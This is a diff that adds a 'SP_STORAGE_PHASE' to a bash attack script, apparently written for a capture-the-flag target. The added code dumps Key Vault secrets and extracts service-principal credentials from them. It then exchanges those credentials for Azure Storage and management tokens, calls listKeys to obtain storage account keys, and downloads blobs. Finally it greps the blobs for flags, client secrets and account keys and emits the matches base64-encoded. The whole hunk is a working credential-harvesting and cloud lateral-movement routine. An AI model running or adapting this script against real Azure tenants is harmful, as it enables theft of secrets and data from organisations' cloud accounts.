@@ -79,4 +79,64 @@ for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttb
   done
 done
 say STORAGE_END
+
+say SP_STORAGE_PHASE
+LIST2=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets?api-version=7.4")
+for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
+  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
+  V=$(echo "$S" | jq -r '.value // empty')
+  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true)
+  CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true)
+  TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
+  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || continue
+  ST2_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://storage.azure.com/.default')
+  ST2=$(echo "$ST2_R" | jq -r '.access_token // empty')
+  say "SP_STORAGE_${name}=$([[ -n "$ST2" ]] && echo OK || echo FAIL)"
+  if [[ -n "$ST2" ]]; then
+    for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs'; do
+      acc=${pair%%:*}; cont=${pair##*:}; base="https://$acc.blob.core.windows.net/$cont"
+      LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $ST2" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
+      names=$(echo "$LB" | jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null || true)
+      say "SPLIST_${name}_${acc}_${cont}=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
+      for bn in $names internal-config.json config.json flag flag.txt export.json credentials.json secrets.json; do
+        [[ -n "$bn" ]] || continue
+        code=$(curl -sS --max-time 20 -o /tmp/sp_blob.bin -w '%{http_code}' -H "Authorization: Bearer $ST2" -H 'x-ms-version: 2021-08-06' "$base/$bn" || echo 000)
+        [[ "$code" == "200" ]] || continue
+        txt=$(head -c 20000 /tmp/sp_blob.bin | tr -d '\000')
+        if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
+          say "SPBLOB_${name}_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
+        fi
+      done
+    done
+  fi
+  MT2_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://management.azure.com/.default')
+  MT2=$(echo "$MT2_R" | jq -r '.access_token // empty')
+  say "SP_ARM_${name}=$([[ -n "$MT2" ]] && echo OK || echo FAIL)"
+  if [[ -n "$MT2" ]]; then
+    RES=$(curl -sS --max-time 25 -H "Authorization: Bearer $MT2" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01")
+    echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.Storage/storageAccounts") | [.name,.id] | @tsv' | while IFS=$'\t' read -r acct rid; do
+      [[ -n "$acct" ]] || continue
+      KEYS=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $MT2" -H 'Content-Length: 0' "https://management.azure.com${rid}/listKeys?api-version=2023-01-01")
+      KEY=$(echo "$KEYS" | jq -r '.keys[0].value // empty' 2>/dev/null || true)
+      [[ -n "$KEY" ]] || { say "SPKEY_${name}_${acct}=FAIL"; continue; }
+      say "SPKEY_${name}_${acct}=OK"
+      if command -v az >/dev/null 2>&1; then
+        CS="DefaultEndpointsProtocol=https;AccountName=$acct;AccountKey=$KEY;EndpointSuffix=core.windows.net"
+        for cont in config exports logs; do
+          names=$(az storage blob list --connection-string "$CS" --container-name "$cont" --query '[].name' -o tsv --only-show-errors 2>/dev/null || true)
+          say "AZLIST_${name}_${acct}_${cont}=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
+          for bn in $names internal-config.json flag flag.txt export.json credentials.json; do
+            [[ -n "$bn" ]] || continue
+            az storage blob download --connection-string "$CS" --container-name "$cont" --name "$bn" --file /tmp/az_blob --no-progress --only-show-errors >/dev/null 2>&1 || continue
+            txt=$(head -c 30000 /tmp/az_blob | tr -d '\000')
+            if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
+              say "AZBLOB_${name}_${acct}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
+            fi
+          done
+        done
+      fi
+    done
+  fi
+done
+say SP_STORAGE_END
 say END
